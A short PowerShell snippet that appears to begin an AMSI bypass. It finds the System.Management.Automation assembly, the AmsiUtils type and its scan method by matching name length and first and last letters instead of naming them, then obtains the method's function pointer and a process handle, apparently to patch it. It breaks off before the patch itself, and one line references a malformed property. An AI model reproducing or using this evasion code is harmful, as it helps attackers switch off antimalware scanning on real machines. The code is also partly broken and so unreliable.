$asmList = [appdomain]::currentdomain.getassemblies()
$asmList | ForEach-Object {
    if($_.Location -ne $null){
        $asmName = $_.FullName.Split(",")[0]
        If($asmName.StartsWith('S') -And $asmName.EndsWith('n') -And $asmName.Length -eq 28) {
            $typeList = $_.GetTypes()
        }
    }
}

$typeList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
            $mList = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
        }
    }
}

$mList | ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('S') -And $_.Ne.Length -eq 11) {
            $scanMethod = $_
        }
    }
}

$MethodPointer = $scanMethod.MethodHandle.GetFunctionPointer()
$Handle = [NtHelpers]::GetCurrentProcess()
$pad = 0
$callRet = $false
